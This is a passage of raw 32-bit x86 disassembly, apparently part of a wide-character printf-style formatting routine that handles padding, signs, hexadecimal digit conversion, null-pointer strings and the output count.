mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jb 0x806c7ea
mov dword [var_4h_2], ecx
mov dword [esp], edi
jmp 0x806c847
lea eax, [var_fach]
mov dword [var_8h_2], 0xfa0
mov dword [var_4h_2], eax
mov eax, dword [var_1048h]
mov dword [esp], eax
call fcn.08053300
mov esi, eax
mov dword [var_10ech], 0
xor edi, edi
test esi, esi
je 0x806ca89
mov eax, dword [var_10ech]
test eax, eax
jne 0x806ca5d
cmp dword [var_1100h], 0x53
je 0x806ca5d
mov ebx, dword [var_10f4h]
mov dword [var_1024h], esi
cmp ebx, 0xffffffff
je 0x806ca4e
lea esi, [ebx*4]
cmp esi, 0x1000
ja 0x806ca22
lea eax, [esi + 0x10]
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
lea eax, [var_1020h]
mov dword [var_8h_2], ebx
mov dword [var_1020h], 0
mov dword [var_sp_ch], eax
mov dword [var_101ch], 0
mov dword [esp], esi
lea eax, [var_1024h]
mov dword [var_4h_2], eax
call fcn.08077d80
cmp eax, 0xffffffff
mov ebx, eax
je 0x806c5e3
sub dword [var_10f0h], ebx
js 0x806c9f8
mov eax, dword [var_10d4h]
test eax, eax
jne 0x806c987
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806c987
mov ecx, dword [var_10f0h]
mov eax, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov dword [esp], eax
call fcn.08075900
add dword [var_1030h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
mov eax, dword [var_10d4h]
add dword [var_1030h], ebx
test eax, eax
je 0x806c9e3
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806c9e3
mov ecx, dword [var_10f0h]
mov eax, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov dword [esp], eax
call fcn.08075900
add dword [var_1030h], eax
test edi, edi
je 0x806bf3b
mov dword [esp], esi
call fcn.08051180
jmp 0x806bf3b
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
add dword [var_1030h], ebx
jmp 0x806bf3b
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806c8f9
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x806c5e3
mov edi, 1
jmp 0x806c905
mov dword [esp], esi
call fcn.08053400
mov ebx, eax
jmp 0x806c8e6
cmp dword [var_10f4h], 0xffffffff
je 0x806ca7f
mov eax, dword [var_10f4h]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.080783a0
mov ebx, eax
jmp 0x806c944
mov dword [esp], esi
call fcn.08077690
jmp 0x806ca78
cmp dword [var_10f4h], 0xffffffff
je 0x806ca9b
cmp dword [var_10f4h], 5
jle 0x806caaa
mov esi, str._null_
mov ebx, 6
jmp 0x806c944
mov esi, 0x8092948
xor ebx, ebx
jmp 0x806c944
mov edi, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806cb4a
mov edx, dword [var_10e0h]
test edx, edx
jne 0x806cb30
mov eax, dword [var_10e8h]
test eax, eax
jne 0x806cb19
mov eax, dword [var_10e4h]
test eax, eax
je 0x806cb03
mov eax, dword [arg_10h]
mov edx, dword [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov word [eax], dx
jmp 0x806bf3b
mov eax, dword [arg_10h]
mov ecx, dword [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [eax], ecx
jmp 0x806bf3b
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
movzx edx, byte [var_1030h]
mov byte [eax], dl
jmp 0x806bf3b
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [var_1030h]
cdq
mov dword [ecx], eax
mov dword [ecx + 4], edx
jmp 0x806bf3b
mov eax, dword [var_10e0h]
test eax, eax
jne 0x806cbca
mov eax, dword [var_10e8h]
test eax, eax
jne 0x806cbaf
mov eax, dword [var_10e4h]
test eax, eax
je 0x806cb8c
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov edi, dword [var_1030h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
mov word [eax], di
jmp 0x806bf3b
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov edi, dword [var_1030h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
mov dword [eax], edi
jmp 0x806bf3b
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x806cb22
mov esi, dword [var_10a0h]
mov edi, dword [var_10a8h]
mov eax, dword [esi + edx + 0x24]
lea eax, [eax + eax*2]
mov ecx, dword [edi + eax*4]
jmp 0x806cb39
mov eax, dword [var_1044h]
lea edx, [eax + eax*2]
mov eax, dword [var_10a0h]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d2c3
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
je 0x806d2a0
mov dword [var_10c8h], 0x10
mov dword [var_10c4h], eax
mov dword [var_10bch], 0
mov dword [var_10cch], 1
mov dword [var_10dch], 0
mov dword [var_1100h], 0x78
cmp dword [var_10f4h], 0
jl 0x806d291
mov byte [var_10f9h], 0x20
jne 0x806d165
mov eax, dword [var_10c4h]
test eax, eax
jne 0x806d165
cmp dword [var_10c8h], 8
mov esi, dword [var_103ch]
je 0x806d149
mov eax, dword [var_103ch]
sub eax, esi
sar eax, 2
cmp dword [var_10f4h], eax
jg 0x806ccc0
mov edi, dword [var_10c4h]
test edi, edi
je 0x806ccc0
mov ebx, dword [var_10cch]
test ebx, ebx
je 0x806ccc0
cmp dword [var_10c8h], 8
je 0x806d13b
lea esi, [esi]
mov edx, dword [var_103ch]
mov eax, 0
mov ecx, dword [var_10d4h]
sub edx, esi
sar edx, 2
sub dword [var_10f4h], edx
cmovns eax, dword [var_10f4h]
test ecx, ecx
mov dword [var_10f4h], eax
jne 0x806cf51
lea eax, [eax + edx]
mov edx, dword [var_10c4h]
sub dword [var_10f0h], eax
test edx, edx
je 0x806cd2b
mov eax, dword [var_10cch]
test eax, eax
je 0x806cd2b
mov eax, dword [var_10f0h]
sub eax, 2
cmp dword [var_10c8h], 0x10
cmovne eax, dword [var_10f0h]
mov dword [var_10f0h], eax
mov eax, dword [var_10bch]
test eax, eax
jne 0x806cd49
mov eax, dword [var_10d8h]
test eax, eax
jne 0x806cd49
mov eax, dword [var_10d0h]
test eax, eax
je 0x806cd4f
dec dword [var_10f0h]
cmp byte [var_10f9h], 0x20
je 0x806cf15
mov eax, dword [var_10bch]
test eax, eax
je 0x806ceae
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ce92
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
mov ecx, dword [var_10c4h]
test ecx, ecx
je 0x806cdab
mov edx, dword [var_10cch]
test edx, edx
je 0x806cdab
cmp dword [var_10c8h], 0x10
je 0x806ce13
mov edi, dword [var_10f4h]
add dword [var_10f0h], edi
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806cde4
mov eax, dword [var_10f0h]
mov edx, dword [arg_8h]
mov dword [var_4h_2], 0x30
mov dword [var_8h_2], eax
mov dword [esp], edx
call fcn.08075900
add dword [var_1030h], eax
mov ecx, dword [arg_8h]
mov ebx, dword [var_103ch]
mov eax, dword [ecx + 0x94]
sub ebx, esi
mov dword [esp], ecx
sar ebx, 2
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
je 0x806bf35
jmp 0x806c5e3
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ce73
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ce5b
mov ecx, dword [var_1100h]
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
inc dword [ebp - 0x1030]
jmp 0x806cdab
mov eax, dword [var_1100h]
mov edx, dword [arg_8h]
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806ce4a
mov dword [var_4h_2], 0x30
mov dword [esp], ecx
call fcn.08075d10
inc eax
je 0x806c5e3
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
jmp 0x806ce2d
mov dword [var_4h_2], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x806cd88
jmp 0x806c5e3
mov edi, dword [var_10d8h]
test edi, edi
je 0x806cede
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806ced1
mov dword [eax], 0x2b
jmp 0x806cd82
mov dword [var_4h_2], 0x2b
mov dword [esp], edi
jmp 0x806ce9d
mov ebx, dword [var_10d0h]
test ebx, ebx
je 0x806cd8e
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806cf05
mov dword [eax], 0x20
jmp 0x806cd82
mov edx, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [esp], edx
jmp 0x806ce9d
mov eax, dword [var_10f0h]
test eax, eax
jle 0x806cf42
mov edi, dword [var_10f0h]
mov eax, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], edi
mov dword [esp], eax
call fcn.08075900
add dword [var_1030h], eax
mov dword [var_10f0h], 0
jmp 0x806cd5c
mov eax, dword [var_10bch]
test eax, eax
je 0x806d0d4
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d0b8
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
dec dword [var_10f0h]
mov eax, dword [var_10c4h]
test eax, eax
je 0x806cfaa
mov eax, dword [var_10cch]
test eax, eax
je 0x806cfaa
cmp dword [var_10c8h], 0x10
je 0x806d035
mov ebx, dword [var_103ch]
mov edi, dword [var_10f4h]
sub ebx, esi
sar ebx, 2
lea eax, [edi + ebx]
sub dword [var_10f0h], eax
test edi, edi
jle 0x806cfe5
mov eax, dword [arg_8h]
mov dword [var_8h_2], edi
mov dword [var_4h_2], 0x30
mov dword [esp], eax
call fcn.08075900
add dword [var_1030h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
mov edi, dword [var_10f0h]
add dword [var_1030h], eax
test edi, edi
jle 0x806bf3b
mov ecx, dword [var_10f0h]
mov esi, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov dword [esp], esi
jmp 0x806c833
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d09c
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d084
mov ecx, dword [var_1100h]
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
inc dword [var_1030h]
sub dword [var_10f0h], 2
jmp 0x806cfaa
mov eax, dword [var_1100h]
mov edx, dword [arg_8h]
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806d06c
mov dword [var_4h_2], 0x30
mov dword [esp], edi
call fcn.08075d10
inc eax
je 0x806c5e3
mov edx, dword [edi + 0x58]
jmp 0x806d04f
mov dword [var_4h_2], 0x2d
mov dword [esp], edi
call fcn.08075d10
inc eax
jne 0x806cf7d
jmp 0x806c5e3
mov eax, dword [var_10d8h]
test eax, eax
je 0x806d107
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d0f7
mov dword [eax], 0x2b
jmp 0x806cf77
mov edx, dword [arg_8h]
mov dword [var_4h_2], 0x2b
mov dword [esp], edx
jmp 0x806d0c3
mov eax, dword [var_10d0h]
test eax, eax
je 0x806cf89
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d12e
mov dword [eax], 0x20
jmp 0x806cf77
mov dword [var_4h_2], 0x20
mov dword [esp], ecx
jmp 0x806d0c3
sub esi, 4
mov dword [esi], 0x30
jmp 0x806ccc0
mov eax, dword [var_10cch]
test eax, eax
je 0x806cc85
sub esi, 4
mov dword [esi], 0x30
jmp 0x806cc85
cmp dword [var_1100h], 0x58
mov esi, str.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
mov ecx, dword [var_10c4h]
sete al
mov ebx, dword [var_103ch]
test al, 1
mov eax, str.0123456789abcdefghijklmnopqrstuvwxyz
cmove esi, eax
cmp dword [var_10c8h], 0xa
je 0x806d26b
ja 0x806d247
cmp dword [var_10c8h], 8
je 0x806d233
lea esi, [esi]
mov eax, ecx
xor edx, edx
sub ebx, 4
div dword [var_10c8h]
mov ecx, eax
mov eax, dword [esi + edx*4]
test ecx, ecx
mov dword [ebx], eax
jne 0x806d1b0
mov eax, dword [var_10dch]
mov esi, ebx
test eax, eax
je 0x806d1ff
mov eax, dword [var_102ch]
test eax, eax
je 0x806d1ff
mov edx, dword [var_1028h]
mov ecx, dword [var_102ch]
mov eax, ebx
mov dword [esp], edx
mov edx, dword [var_103ch]
call fcn.0806f240
sub esp, 4
mov esi, eax
mov eax, dword [var_10f8h]
test eax, eax
je 0x806cc85
cmp dword [var_10c8h], 0xa
jne 0x806cc85
mov ecx, dword [var_103ch]
mov dword [esp], esi
mov dword [var_4h_2], ecx
call fcn.0806b880
mov esi, eax
jmp 0x806cc85
mov eax, ecx
sub ebx, 4
and eax, 7
shr ecx, 3
mov eax, dword [esi + eax*4]
mov dword [ebx], eax
jne 0x806d233
jmp 0x806d1c8
cmp dword [var_10c8h], 0x10
jne 0x806d1b0
mov eax, ecx
sub ebx, 4
and eax, 0xf
shr ecx, 4
mov eax, dword [esi + eax*4]
mov dword [ebx], eax
jne 0x806d254
jmp 0x806d1c8
mov edi, 0xcccccccd
mov eax, ecx
sub ebx, 4
mul edi
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub ecx, eax
test edx, edx
mov eax, dword [esi + ecx*4]
mov ecx, edx
mov dword [ebx], eax
jne 0x806d270
jmp 0x806d1c8
mov dword [var_10f4h], 1
jmp 0x806d165
cmp dword [var_10f4h], 4
mov eax, 5
mov esi, str._nil_
cmovg eax, dword [var_10f4h]
mov dword [var_10f4h], eax
jmp 0x806c8a2
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x806cc0a
mov ecx, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [ecx + ecx*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d304
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov esi, dword [eax]
jmp 0x806c8ac
mov esi, dword [var_10a0h]
mov edi, dword [var_10a8h]
mov eax, dword [esi + edx + 0x24]
lea eax, [eax + eax*2]
mov esi, dword [edi + eax*4]
jmp 0x806c8ac
mov eax, dword [var_10ech]
test eax, eax
jne case.0x806c1dd.57
mov edi, dword [var_10d4h]
dec dword [var_10f0h]
test edi, edi
jne 0x806d36a
mov esi, dword [var_10f0h]
test esi, esi
jle 0x806d36a
mov edx, dword [var_10f0h]
mov ecx, dword [arg_8h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], edx
mov dword [esp], ecx
call fcn.08075900
add dword [var_1030h], eax
mov esi, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [esi + esi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d39b
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [esp], eax
call fcn.08077740
mov ecx, eax
jmp 0x806c865
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
movzx eax, byte [esi + eax*4]
jmp 0x806d38c
mov edi, dword [var_1044h]
mov edx, dword [var_10a0h]
lea eax, [edi + edi*2]
shl eax, 4
add edx, eax
jne 0x806d523
lea ebx, [var_fech]
mov eax, edx
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_10f4h]
mov esi, dword [var_1100h]
rep stosd dword es:[edi], eax
mov ecx, dword [var_10f0h]
movzx eax, byte [var_10e4h]
mov dword [var_fech], edx
mov dword [var_fe4h], esi
mov esi, dword [var_10e0h]
mov dword [var_fe8h], ecx
movzx ecx, byte [var_10e0h]
and eax, 1
add eax, eax
and ecx, 1
movzx edx, byte [var_fe0h]
and edx, 0xfffffffc
or edx, ecx
movzx ecx, byte [var_10ech]
or edx, eax
movzx eax, byte [var_10cch]
and edx, 0xfffffff3
and ecx, 1
shl ecx, 2
and eax, 1
shl eax, 3
or edx, ecx
movzx ecx, byte [var_10d0h]
or edx, eax
movzx eax, byte [var_10d4h]
and edx, 0xffffffcf
and ecx, 1
shl ecx, 4
and eax, 1
shl eax, 5
or edx, ecx
movzx ecx, byte [var_10dch]
or edx, eax
movzx eax, byte [var_10d8h]
and edx, 0x3f
shl ecx, 7
and eax, 1
shl eax, 6
or edx, eax
movzx eax, byte [var_10f8h]
or edx, ecx
mov byte [var_fe0h], dl
movzx edx, byte [var_fdfh]
and eax, 1
shl eax, 3
or edx, 4
and edx, 0xfffffff7
or edx, eax
test esi, esi
movsx eax, byte [var_10f9h]
mov byte [var_fdfh], dl
mov dword [var_fdch], eax
je 0x806d512
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_fc8h], edx
mov dword [var_fc4h], ecx
mov dword [var_fcch], eax
lea eax, [var_fcch]
mov dword [var_4h_2], ebx
mov dword [var_1014h], eax
lea eax, [var_1014h]
mov dword [var_8h_2], eax
mov edi, dword [arg_8h]
mov dword [esp], edi
call fcn.08067f60
jmp 0x806bf2d
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0xfcc]
jmp 0x806d4e8
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + eax + 0x24]
mov dword [var_4h_2], edx
lea eax, [eax + eax*2]
lea eax, [esi + eax*4]
jmp 0x806d4f2
mov dword [var_10c8h], 0x10
mov esi, dword [var_10e0h]
mov dword [var_10bch], 0
mov dword [var_10d8h], 0
mov dword [var_10d0h], 0
test esi, esi
je 0x806d6ed
mov eax, dword [var_1044h]
lea edx, [eax + eax*2]
mov eax, dword [var_10a0h]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d6c2
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax]
mov ecx, dword [eax + 4]
mov dword [var_10c4h], edx
mov dword [var_10c0h], ecx
cmp dword [var_10f4h], 0
jl 0x806d6b3
mov byte [var_10f9h], 0x20
jne 0x806d60e
mov eax, dword [var_10c0h]
or eax, dword [var_10c4h]
jne 0x806d60e
cmp dword [var_10c8h], 8
mov esi, dword [var_103ch]
je 0x806d5f9
mov edx, dword [var_10c4h]
or edx, dword [var_10c0h]
setne al
movzx eax, al
mov dword [var_10c4h], eax
jmp 0x806cc85
mov ebx, dword [var_10cch]
test ebx, ebx
je 0x806d5dc
sub esi, 4
mov dword [esi], 0x30
jmp 0x806d5dc
xor eax, eax
mov ecx, dword [var_103ch]
mov esi, dword [var_10c4h]
cmp dword [var_1100h], 0x58
mov edx, dword [var_10c8h]
sete al
mov edi, dword [var_10c0h]
mov dword [var_8h_2], ecx
mov dword [esp], esi
mov dword [var_sp_ch], edx
mov dword [var_4h_2], edi
mov dword [var_10h], eax
call fcn.0808d930
mov ecx, dword [var_10dch]
mov esi, eax
test ecx, ecx
je 0x806d67f
mov edx, dword [var_102ch]
test edx, edx
je 0x806d67f
mov edi, dword [var_1028h]
mov ecx, dword [var_102ch]
mov edx, dword [var_103ch]
mov dword [esp], edi
call fcn.0806f240
sub esp, 4
mov esi, eax
mov edi, dword [var_10f8h]
test edi, edi
je 0x806d5dc
cmp dword [var_10c8h], 0xa
jne 0x806d5dc
mov eax, dword [var_103ch]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.0806b880
mov esi, eax
jmp 0x806d5dc
mov dword [var_10f4h], 1
jmp 0x806d60e
mov ecx, dword [var_10a0h]
mov edi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov esi, dword [edi + eax*4]
mov edi, dword [edi + eax*4 + 4]
mov dword [var_10c4h], esi
mov dword [var_10c0h], edi
jmp 0x806d5a9
mov ecx, dword [var_1044h]
mov eax, dword [var_10a0h]
lea edx, [ecx + ecx*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d745
mov esi, dword [var_10e8h]
test esi, esi
je 0x806d724
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [var_10c4h], eax
jmp 0x806cc4a
mov ebx, dword [var_10e4h]
test ebx, ebx
jne 0x806d739
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
jmp 0x806d719
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, word [eax]
jmp 0x806d719
mov ecx, dword [var_10e8h]
test ecx, ecx
je 0x806d768
mov esi, dword [var_10a0h]
mov edi, dword [var_10a8h]
mov eax, dword [esi + edx + 0x24]
lea eax, [eax + eax*2]
movzx eax, byte [edi + eax*4]
jmp 0x806d719
mov eax, dword [var_10e4h]
test eax, eax
jne 0x806d78a
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x806d719
mov edi, dword [var_10a0h]
mov eax, dword [edi + edx + 0x24]
mov edx, dword [var_10a8h]
lea eax, [eax + eax*2]
movzx eax, word [edx + eax*4]
jmp 0x806d719
mov dword [var_10c8h], 8
jmp 0x806d549
mov dword [var_10c8h], 0xa
jmp 0x806d549
mov edi, dword [var_10e0h]
mov dword [var_10c8h], 0xa
test edi, edi
je 0x806d83d
mov eax, dword [var_1044h]
lea edx, [eax + eax*2]
mov eax, dword [var_10a0h]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d821
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov edi, edx
shr edi, 0x1f
mov dword [var_10bch], edi
je 0x806d810
neg eax
adc edx, 0
neg edx
mov dword [var_10c4h], eax
mov dword [var_10c0h], edx
jmp 0x806d5a9
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov edx, dword [esi + eax*4 + 4]
mov eax, dword [esi + eax*4]
jmp 0x806d7fc
mov eax, dword [var_1044h]
lea edx, [eax + eax*2]
mov eax, dword [var_10a0h]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806d87b
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov edx, dword [eax]
mov eax, edx
mov edi, edx
neg eax
shr edi, 0x1f
cmovne edx, eax
mov dword [var_10bch], edi
mov dword [var_10c4h], edx
jmp 0x806cc4a
mov ecx, dword [var_10a0h]
mov esi, dword [var_10a8h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov edx, dword [esi + eax*4]
jmp 0x806d85e
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806d8b8
mov dword [eax], 0x25
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
jmp 0x806bf3b
mov dword [var_4h_2], 0x25
mov dword [esp], edi
call fcn.08075d10
inc eax
jne 0x806d8ad
jmp 0x806c5e3
lea ebx, [var_fech]
xor eax, eax
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_1094h]
rep stosd dword es:[edi], eax
mov eax, dword [var_1084h]
movzx ecx, byte [var_107ch]
mov dword [var_fe4h], edx
mov edi, dword [var_1088h]
movzx edx, byte [var_1078h]
mov dword [var_fe8h], eax
shl ecx, 2
mov dword [var_fech], edi
add edx, edx
movzx eax, byte [var_fe0h]
or byte [var_fdfh], 4
and eax, 0xfffffffc
or eax, dword [var_1074h]
or eax, edx
movzx edx, byte [var_1060h]
and eax, 0xfffffff3
or eax, ecx
movzx ecx, byte [var_1064h]
shl edx, 3
or eax, edx
movzx edx, byte [var_1068h]
shl ecx, 4
and eax, 0xffffffcf
or eax, ecx
movzx ecx, byte [var_106ch]
shl edx, 5
or eax, edx
movzx edx, byte [var_1070h]
shl ecx, 6
and eax, 0x3f
or eax, ecx
mov ecx, dword [var_1090h]
shl edx, 7
or eax, edx
mov dword [var_fdch], ecx
mov byte [var_fe0h], al
mov eax, dword [var_1074h]
test eax, eax
je 0x806da82
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_fc8h], edx
mov dword [var_fc4h], ecx
mov dword [var_fcch], eax
mov esi, dword [arg_8h]
lea eax, [var_fcch]
mov dword [var_4h], ebx
mov dword [var_1000h], eax
lea eax, [var_1000h]
mov dword [var_8h], eax
mov dword [esp], esi
call fcn.0806a140
test eax, eax
js 0x806c5e3
add dword [var_1030h], eax
mov eax, dword [var_1038h]
inc dword [var_1044h]
test eax, eax
jne 0x806da6f
mov ebx, dword [var_ff4h]
add ebx, 4
mov dword [var_ff4h], ebx
mov dword [esp], ebx
call fcn.08074b00
mov esi, dword [arg_8h]
mov edx, eax
mov dword [var_ff4h], eax
sub edx, ebx
sar edx, 2
mov eax, dword [esi + 0x94]
mov dword [esp], esi
mov dword [var_4h], ebx
mov dword [var_8h], edx
call dword [eax + 0x1c]
mov ecx, dword [var_ff4h]
mov edx, eax
mov eax, ecx
sub eax, ebx
sar eax, 2
cmp edx, eax
jne 0x806da60
mov eax, dword [ecx]
add dword [var_1030h], edx
test eax, eax
jne 0x806bb53
jmp 0x806bb01
mov dword [var_1030h], 0xffffffff
jmp 0x806bb01
mov ecx, dword [var_1038h]
mov dword [esp], ecx
call fcn.08051180
jmp 0x806d9fd
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0xfcc]
jmp 0x806d9ba
mov eax, dword [var_1068h]
dec dword [var_1084h]
test eax, eax
jne 0x806dad3
mov eax, dword [var_1084h]
test eax, eax
jle 0x806dad3
mov edx, dword [var_1084h]
mov ecx, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075900
add dword [var_1030h], eax
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov esi, dword [arg_8h]
mov edx, dword [esi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806db3d
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
mov eax, dword [var_1068h]
inc dword [var_1030h]
test eax, eax
je 0x806d9ed
mov eax, dword [var_1084h]
test eax, eax
jle 0x806d9ed
mov edi, dword [var_1084h]
mov eax, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [var_8h], edi
mov dword [esp], eax
call fcn.08075900
jmp 0x806d9e7
mov dword [var_4h], ecx
mov dword [esp], esi
call fcn.08075d10
inc eax
jmp 0x806daf3
lea eax, [var_fach]
mov dword [var_8h], 0xfa0
mov dword [var_4h], eax
mov eax, dword [var_1048h]
mov dword [esp], eax
call fcn.08053300
mov esi, eax
mov dword [var_107ch], 0
xor edi, edi
test esi, esi
je 0x806dd55
mov eax, dword [var_107ch]
test eax, eax
jne 0x806dd29
cmp dword [var_1094h], 0x53
je 0x806dd29
mov ebx, dword [var_1088h]
mov dword [var_100ch], esi
cmp ebx, 0xffffffff
je 0x806dd1a
lea esi, [ebx*4]
cmp esi, 0x1000
ja 0x806dcee
lea eax, [esi + 0x10]
sub esp, eax
lea esi, [var_10f9h]
and esi, 0xfffffff0
lea eax, [var_1008h]
mov dword [var_8h], ebx
mov dword [var_1008h], 0
mov dword [esp + 0xc], eax
mov dword [var_1004h], 0
mov dword [esp], esi
lea eax, [var_100ch]
mov dword [var_4h], eax
call fcn.08077d80
cmp eax, 0xffffffff
